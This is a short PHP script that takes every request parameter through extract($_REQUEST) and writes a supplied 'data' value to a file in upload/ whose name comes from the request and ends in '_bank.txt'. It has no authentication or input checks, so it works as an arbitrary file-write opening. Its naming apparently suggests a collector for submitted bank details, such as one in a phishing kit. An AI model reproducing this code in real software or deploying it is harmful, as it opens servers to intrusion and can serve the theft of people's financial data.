<?php
extract($_REQUEST);

$ff=$bc."_bank.txt";

$f2=fopen("upload/$ff","w");
fwrite($f2,$data);

?>